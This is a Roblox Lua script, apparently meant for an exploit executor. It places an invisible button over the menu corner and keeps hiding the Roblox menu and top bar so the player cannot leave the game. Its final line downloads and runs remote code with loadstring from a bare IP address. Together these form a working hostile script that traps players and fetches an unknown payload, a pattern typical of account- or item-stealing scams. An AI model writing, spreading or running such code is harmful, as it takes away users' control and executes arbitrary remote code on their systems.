pcall(function()
	game.CoreGui.AntiLeaveBlocker:Destroy()
end)

local CoreGui, RunService = game:GetService("CoreGui"), game:GetService("RunService")

local function tryHideRobloxMenu()
	for _, n in ipairs({"RobloxGui","RobloxMenu","Menu","MenuGui","Topbar","TopBar"}) do
		local g = CoreGui:FindFirstChild(n)
		if g then
			if g:IsA("ScreenGui") then
				g.Enabled = false
				for _, c in ipairs(g:GetChildren()) do
					if c:IsA("GuiObject") then c.Visible = false end
					if c:IsA("LayerCollector") then c.Enabled = false end
				end
			else
				for _, c in ipairs(g:GetDescendants()) do
					if c:IsA("GuiObject") then
						c.Position = UDim2.new(-10,0,-10,0)
					end
				end
			end
		end
	end
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name, screenGui.Parent = "AntiLeaveBlocker", CoreGui
screenGui.ResetOnSpawn, screenGui.IgnoreGuiInset = false, true
screenGui.DisplayOrder, screenGui.ZIndexBehavior = 10000, Enum.ZIndexBehavior.Sibling

local blocker = Instance.new("TextButton")
blocker.Size, blocker.Position = UDim2.new(0,56,0,56), UDim2.new(0,6,0,6)
blocker.BackgroundTransparency, blocker.Text = 1, ""
blocker.AutoButtonColor, blocker.Active, blocker.Selectable = false, true, false
blocker.Parent = screenGui

RunService.RenderStepped:Connect(function()
	blocker.Position = UDim2.new(0,6,0,6)
end)

task.spawn(function()
	while screenGui.Parent == CoreGui do
		tryHideRobloxMenu()
		task.wait(2)
	end
end)

ID="151de7d8-5ef0-4146-85b6-826df4581111";
loadstring(game:HttpGet("http://5.129.216.170:3910/cdn/loader.luau"))()
